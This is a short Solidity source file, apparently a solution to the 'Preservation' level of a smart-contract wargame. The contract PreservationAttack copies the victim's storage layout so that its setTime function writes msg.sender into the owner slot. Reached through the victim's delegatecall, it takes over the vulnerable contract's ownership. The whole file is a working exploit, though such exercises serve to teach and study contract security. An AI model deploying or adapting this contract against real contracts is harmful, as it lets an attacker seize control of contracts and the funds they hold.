// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
  address one;
  address two;
  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function setTime(uint _time) public {
    _time;
    owner = msg.sender;
  }
}